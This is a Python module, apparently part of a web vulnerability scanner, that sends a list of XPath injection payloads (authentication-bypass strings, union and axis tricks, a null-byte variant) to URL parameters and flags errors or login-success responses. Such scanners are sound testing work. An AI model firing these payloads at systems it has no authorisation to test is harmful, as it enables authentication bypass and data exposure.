"""XPath Injection active probe."""

import re
from typing import Any
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse

from src.analysis._core.http_request import _safe_request
from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._confidence import probe_confidence, probe_severity

XPATH_PAYLOADS = [
    ("or_true_1", "' or '1'='1"),
    ("or_true_2", '" or "1"="1'),
    ("or_true_3", "' or 1=1 or '"),
    ("or_true_4", '" or 1=1 or "'),
    ("admin_or", "admin' or '1'='1"),
    ("empty_or", "' or ''='"),
    ("or_name", "x' or 1=1 or 'x'='y"),
    ("xpath_name", "' or name()='username"),
    ("xpath_union", "']|//*|//*['"),
    ("comment", "admin'/*"),
    ("encoded_or", "'+or+name()='admin"),
    ("null_byte", "' or '1'='1'\x00"),
    ("double_quote_admin", 'admin" or "1"="1'),
    ("predicate_bypass", "' or position()=1 or '"),
    ("ancestor_axis", "' or ancestor-or-self::* or '"),
]

XPATH_ERROR_RE = re.compile(
    r"(?i)(?:xpath|XPath|XPathExpression|Invalid\s*expression|"
    r"Unbalanced\s*expression|XML\s*query|XPath\s*error|"
    r"xpath_eval|xpath_select|xpath_apply|xpath_parse|"
    r"XPathException|XPathError|XPathSyntaxError|"
    r"Invalid\s*XPath|XPath\s*evaluation|"
    r"System\.Xml\.XPath|javax\.xml\.xpath|"
    r"XPathQuery|xpath_query|SimpleXML|"
    r"XPath\s*parse\s*error|XPath\s*compilation|"
    r"unexpected\s*token.*xpath|XPath\s*assertion)"
)

XPATH_AUTH_BYPASS_RE = re.compile(
    r"(?i)(?:welcome|logged\s*in|authenticated|dashboard|"
    r"admin\s*panel|user\s*profile|session|token|"
    r"access\s*granted|login\s*success)"
)

XML_CONTENT_RE = re.compile(
    r"(?i)(?:xml|xpath|query|search|filter|lookup|find|fetch|retrieve|lookup)"
)

XPATH_PARAM_NAMES = {
    "query",
    "search",
    "filter",
    "xpath",
    "xml",
    "lookup",
    "find",
    "fetch",
    "user",
    "username",
    "login",
    "name",
    "id",
    "node",
    "element",
    "path",
    "expr",
    "expression",
    "select",
    "where",
    "condition",
    "criteria",
    "pattern",
    "auth",
    "authenticate",
    "check",
    "validate",
}


def _is_xml_backed_endpoint(url: str, response: dict[str, Any] | None = None) -> bool:
    lowered = url.lower()
    if any(
        hint in lowered
        for hint in ("/xml", "/xpath", "/query", "/search", "/api/", "/soap", "/xmlrpc", "/graphql")
    ):
        return True
    if response:
        body = str(response.get("body_text") or response.get("body") or "")
        headers = {str(k).lower(): str(v) for k, v in response.get("headers", {}).items()}
        content_type = headers.get("content-type", "")
        if (
            "xml" in content_type
            or body.strip().startswith("<?xml")
            or body.strip().startswith("<")
        ):
            return True
    query_pairs = parse_qsl(urlparse(url).query, keep_blank_values=True)
    param_names = {k.lower() for k, _ in query_pairs}
    if param_names & XPATH_PARAM_NAMES:
        return True
    return False


def xpath_injection_active_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 10,
) -> list[dict[str, Any]]:
    """Test endpoints for XPath injection vulnerabilities.

    Sends XPath injection payloads to URL parameters on endpoints that appear
    to be XML-backed. Checks for XPath error patterns, authentication bypass
    indicators, and response divergence.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of XPath injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url or not url.startswith(("http://", "https://")):
            continue

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        original_resp = response_cache.get(url)
        if not _is_xml_backed_endpoint(url, original_resp):
            continue

        target_params = []
        for i, (k, v) in enumerate(query_pairs):
            if k.lower() in XPATH_PARAM_NAMES:
                target_params.append((i, k, v))
            elif XML_CONTENT_RE.search(k.lower()):
                target_params.append((i, k, v))

        if not target_params:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        if not original_resp:
            original_resp = _safe_request(url, timeout=8)
        if not original_resp:
            continue

        original_status = original_resp.get("status", 0)
        original_body = str(original_resp.get("body") or original_resp.get("body_text") or "")

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for idx, param_name, _param_value in target_params:
            if len(url_probes) >= 3:
                break

            for payload_name, payload_value in XPATH_PAYLOADS:
                updated = list(query_pairs)
                updated[idx] = (param_name, payload_value)
                test_url = normalize_url(
                    urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                )

                response = response_cache.request(
                    test_url,
                    headers={"Cache-Control": "no-cache", "X-XPath-Probe": "1"},
                )
                if not response:
                    response = _safe_request(test_url, timeout=10)
                if not response:
                    continue

                body = str(response.get("body_text") or response.get("body") or "")[:8000]
                status = int(response.get("status_code") or response.get("status") or 0)

                issues_for_hit: list[str] = []

                if XPATH_ERROR_RE.search(body):
                    issues_for_hit.append("xpath_error_pattern")
                elif XPATH_AUTH_BYPASS_RE.search(body) and status in (200, 302, 301):
                    if original_status in (401, 403) or len(body) > len(original_body) * 1.5:
                        issues_for_hit.append("xpath_auth_bypass")
                elif status != original_status and status not in (404, 400, 500):
                    if original_status in (200, 401, 403):
                        issues_for_hit.append("xpath_response_divergence")
                elif status == 200 and original_status in (401, 403):
                    issues_for_hit.append("xpath_auth_bypass_status")

                encoded_payload = quote(payload_value, safe="")
                encoded_url = normalize_url(
                    urlunparse(
                        parsed._replace(
                            query=urlencode(
                                [
                                    (
                                        k if i != idx else param_name,
                                        encoded_payload if i == idx else v,
                                    )
                                    for i, (k, v) in enumerate(query_pairs)
                                ],
                                doseq=True,
                            )
                        )
                    )
                )
                if not issues_for_hit:
                    enc_response = response_cache.request(
                        encoded_url,
                        headers={"Cache-Control": "no-cache", "X-XPath-Probe": "1"},
                    )
                    if not enc_response:
                        enc_response = _safe_request(encoded_url, timeout=10)
                    if enc_response:
                        enc_body = str(
                            enc_response.get("body_text") or enc_response.get("body") or ""
                        )[:8000]
                        enc_status = int(
                            enc_response.get("status_code") or enc_response.get("status") or 0
                        )
                        if XPATH_ERROR_RE.search(enc_body):
                            issues_for_hit.append("xpath_error_url_encoded")
                        elif enc_status != status and enc_status in (200, 500):
                            issues_for_hit.append("xpath_encoded_response_diff")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_probes.append(
                        {
                            "parameter": param_name,
                            "payload": payload_value[:100],
                            "payload_type": payload_name,
                            "status_code": status,
                            "issues": issues_for_hit,
                        }
                    )
                    break

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
